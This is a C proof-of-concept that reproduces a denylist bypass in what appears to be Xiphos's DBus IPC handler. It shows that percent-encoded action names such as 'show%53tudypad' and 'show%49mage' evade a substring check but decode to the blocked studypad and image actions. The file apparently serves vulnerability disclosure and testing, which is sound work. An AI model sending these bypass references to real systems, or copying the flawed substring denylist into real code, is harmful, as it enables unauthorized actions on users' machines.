/*
 * Reproduce the DBus denylist bypass:
 * 1) The raw reference does NOT contain the literal "showStudypad" or "showImage".
 * 2) But after libsword URL parsing, the action parameter is decoded to "showStudypad".
 * 3) The handler dispatches to show_studypad / show_image.
 */
#include <stdio.h>
#include <string.h>

/* mimic ipc.c:224-234 */
static int ipc_check(const char *reference) {
    if (!reference) return 0;
    int allow = (strstr(reference, "sword://") ||
                 strstr(reference, "bible://") ||
                 strstr(reference, "passagestudy.jsp") ||
                 strstr(reference, "xiphos.url"));
    int deny  = (strstr(reference, "showStudypad") ||
                 strstr(reference, "showImage"));
    return allow && !deny;
}

/* mimic url.cc:886-914 re-encoding step (only /, :, space) */
static void re_encode(const char *url, char *out) {
    int j = 0;
    for (int i = 0; url[i]; i++) {
        char c = url[i];
        if (c == '/') { out[j++]='%'; out[j++]='2'; out[j++]='F'; }
        else if (c == ':') { out[j++]='%'; out[j++]='3'; out[j++]='A'; }
        else if (c == ' ') { out[j++]='%'; out[j++]='2'; out[j++]='0'; }
        else out[j++] = c;
    }
    out[j] = 0;
}

/* mimic libsword URL::decode (from sword-1.9.0/src/utilfuns/url.cpp:247) */
static int hexval(char c) {
    if (c>='0'&&c<='9') return c-'0';
    if (c>='A'&&c<='F') return c-'A'+10;
    if (c>='a'&&c<='f') return c-'a'+10;
    return -1;
}
static void url_decode(const char *in, char *out) {
    int j=0;
    for (int i=0; in[i]; i++) {
        if (in[i]=='+') { out[j++]=' '; continue; }
        if (in[i]=='%' && in[i+1] && in[i+2]) {
            int a=hexval(in[i+1]), b=hexval(in[i+2]);
            if (a>=0 && b>=0) { out[j++]=(char)(a*16+b); i+=2; continue; }
        }
        out[j++]=in[i];
    }
    out[j]=0;
}

int main() {
    const char *tests[] = {
        "passagestudy.jsp?action=showStudypad&value=evil.spt",  /* direct: blocked */
        "passagestudy.jsp?action=show%53tudypad&value=evil.spt", /* %53 = S: bypass */
        "passagestudy.jsp?action=showImage&value=/tmp/x.png",     /* direct: blocked */
        "passagestudy.jsp?action=show%49mage&value=/tmp/x.png",   /* %49 = I: bypass */
        NULL
    };
    for (int i=0; tests[i]; i++) {
        const char *ref = tests[i];
        printf("=== ref: %s\n", ref);
        printf("  ipc_check: %s\n", ipc_check(ref) ? "ACCEPTED" : "REJECTED");
        char renc[1024];
        re_encode(ref, renc);
        printf("  re-encoded: %s\n", renc);
        /* find ?action= */
        const char *q = strstr(renc, "action=");
        if (q) {
            q += 7;
            char raw_val[256] = {0};
            int j=0;
            for (; q[j] && q[j] != '&' && q[j] != '#'; j++) raw_val[j]=q[j];
            raw_val[j]=0;
            char decoded[256];
            url_decode(raw_val, decoded);
            printf("  action (raw):    %s\n", raw_val);
            printf("  action (decoded):%s\n", decoded);
            printf("  matches 'showStudypad'? %s\n", !strcmp(decoded,"showStudypad")?"YES":"no");
            printf("  matches 'showImage'?    %s\n", !strcmp(decoded,"showImage")?"YES":"no");
        }
        printf("\n");
    }
    return 0;
}
